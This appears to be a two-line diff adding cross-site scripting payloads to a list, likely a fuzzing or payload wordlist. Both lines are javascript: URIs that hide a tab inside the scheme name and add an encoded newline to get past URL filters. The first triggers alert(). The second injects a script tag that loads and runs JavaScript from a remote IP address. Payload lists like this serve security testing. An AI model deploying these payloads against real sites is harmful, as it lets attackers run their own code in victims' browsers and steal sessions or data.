@@ -1,0 +1,2 @@
+javas	cript://example.com/%0aalert%28%29
+javas	cript://example.com/%0adocument.write%28'%3cscript/src=https://193.37.215.120/poc/ss6.js%3e%3c/script%3e'%29
